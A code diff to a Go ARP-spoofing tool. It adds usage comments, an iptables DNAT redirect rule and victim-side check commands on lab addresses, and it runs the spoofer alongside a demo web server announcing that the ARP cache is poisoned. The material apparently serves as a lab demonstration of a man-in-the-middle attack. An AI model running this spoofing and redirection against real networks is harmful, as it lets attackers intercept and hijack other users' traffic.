@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"syscall"
 	"time"
@@ -187,11 +188,21 @@ func getInterface(ifname string, dev *net.Interface) {
 //
 //     mitm (my host) ---------------------------------> victim
 //       |- dev: eth0                                      |- target mac: aa:bb:cc:dd:ee:ff
-//       |- dev mac: 00:11:22:33:44:55
+//       |- dev mac: 00:11:22:33:44:55                     |- ip addr: 192.168.1.3
+//       |- ip addr: 192.168.1.2
 //
 //     remote host (host to take over)
 //       |- ip addr: 192.168.1.1
 //
+//
+// Usage:
+// 	# on my host
+// 	$ ./arp_spoofing aa:bb:cc:dd:ee:ff eth0 192.168.1.1
+// 	$ iptables -t nat -A PREROUTING -s 192.168.1.3 -p tcp --dport 8000 -j DNAT --to-destination 192.168.1.3:8000
+//
+// 	# on victim
+// 	$ arp 192.168.1.1  # check arp table has been poisoned
+// 	$ curl http://192.168.1.1:8000
 func main() {
 
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
@@ -224,5 +235,12 @@ func main() {
 	pkt = append(pkt, eth...)
 	pkt = append(pkt, arp...)
 
-	spoofing(pkt, &dev)
+	// a spoofing goroutine
+	go spoofing(pkt, &dev)
+
+	// run a test webserver
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprintln(w, "Your ARP has been poisoned!!!")
+	})
+	http.ListenAndServe(":8000", nil)
 }
